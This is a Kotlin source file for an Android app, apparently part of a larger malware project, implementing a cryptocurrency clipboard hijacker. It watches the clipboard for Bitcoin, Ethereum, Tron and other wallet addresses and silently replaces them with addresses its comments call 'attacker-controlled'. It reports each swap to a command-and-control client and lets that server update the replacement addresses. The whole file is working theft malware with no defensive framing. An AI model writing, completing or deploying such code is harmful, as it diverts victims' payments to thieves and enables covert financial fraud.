package com.xrc.app.wallet

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.util.Log
import com.xrc.app.XRCApp
import org.json.JSONObject

/**
 * Monitors clipboard for cryptocurrency addresses and hijacks them
 * by replacing with attacker-controlled addresses.
 * Tracks clipboard changes through accessibility service.
 */
object CryptoClipboardHijack {

    const val TAG = "CryptoClipboardHijack"
    private var isActive = false

    // Attacker-controlled wallet addresses
    private var replacementAddresses = mutableMapOf<String, String>()

    // Known crypto address patterns
    private val addressPatterns = mapOf(
        "bitcoin" to Regex("""[13][a-km-zA-HJ-NP-Z1-9]{25,34}"""),
        "bitcoin_segwit" to Regex("""bc1[a-zA-HJ-NP-Z0-9]{39,59}"""),
        "ethereum" to Regex("""0x[a-fA-F0-9]{40}"""),
        "litecoin" to Regex("""L[a-km-zA-HJ-NP-Z1-9]{26,33}"""),
        "dogecoin" to Regex("""D[a-km-zA-HJ-NP-Z1-9]{25,34}"""),
        "bitcoin_cash" to Regex("""(?:bitcoincash:)?[qp][a-z0-9]{41}""", RegexOption.IGNORE_CASE),
        "tron" to Regex("""T[a-zA-HJ-NP-Z1-9]{33}"""),
        "ripple" to Regex("""r[1-9A-HJ-NP-Za-km-z]{25,34}"""),
        "cardano" to Regex("""addr[1-9A-HJ-NP-Za-km-z]{50,100}"""),
        "polkadot" to Regex("""1[1-9A-HJ-NP-Za-km-z]{47}"""),
        "solana" to Regex("""[1-9A-HJ-NP-Za-km-z]{32,44}"""),
        "usdt_erc20" to Regex("""0x[a-fA-F0-9]{40}"""),
        "usdt_trc20" to Regex("""T[a-zA-HJ-NP-Z1-9]{33}""")
    )

    fun activate(context: Context) {
        isActive = true
        Log.i(TAG, "Clipboard hijack activated")

        // Set default replacement addresses (these should be configured via C2)
        replacementAddresses = mutableMapOf(
            "bitcoin" to "bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
            "ethereum" to "0x0000000000000000000000000000000000000000",
            "litecoin" to "Lxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
            "tron" to "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
            "usdt_trc20" to "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
        )

        // Start clipboard monitoring
        startClipboardMonitor(context)
    }

    fun deactivate() {
        isActive = false
        Log.i(TAG, "Clipboard hijack deactivated")
    }

    private fun startClipboardMonitor(context: Context) {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager

        clipboard.addPrimaryClipChangedListener {
            if (!isActive) return@addPrimaryClipChangedListener

            try {
                val clip = clipboard.primaryClip
                val item = clip?.getItemAt(0) ?: return@addPrimaryClipChangedListener
                val text = item.text?.toString() ?: return@addPrimaryClipChangedListener

                // Check if clipboard contains a crypto address
                for ((currency, pattern) in addressPatterns) {
                    val match = pattern.find(text)
                    if (match != null) {
                        val originalAddress = match.value
                        val replacement = replacementAddresses[currency] ?: continue

                        // Replace the address
                        val newText = text.replace(originalAddress, replacement)
                        val newClip = ClipData.newPlainText("text", newText)
                        clipboard.setPrimaryClip(newClip)

                        Log.w(TAG, "Clipboard hijack: $currency address replaced: $originalAddress -> $replacement")

                        // Report to C2
                        val json = JSONObject().apply {
                            put("type", "clipboard_hijack")
                            put("currency", currency)
                            put("original", originalAddress.take(20) + "...")
                            put("replacement", replacement.take(20) + "...")
                            put("timestamp", System.currentTimeMillis())
                        }
                        XRCApp.instance.c2Client.send(json.toString())
                        return@addPrimaryClipChangedListener
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Clipboard monitoring error: ${e.message}")
            }
        }
    }

    fun updateReplacementAddress(currency: String, address: String) {
        replacementAddresses[currency] = address
        Log.d(TAG, "Replacement address updated for $currency: $address")
    }

    fun logSuspiciousActivity(type: String, data: String) {
        val json = JSONObject().apply {
            put("type", "suspicious_activity")
            put("activity_type", type)
            put("data", data)
            put("timestamp", System.currentTimeMillis())
        }
        XRCApp.instance.c2Client.send(json.toString())
    }
}
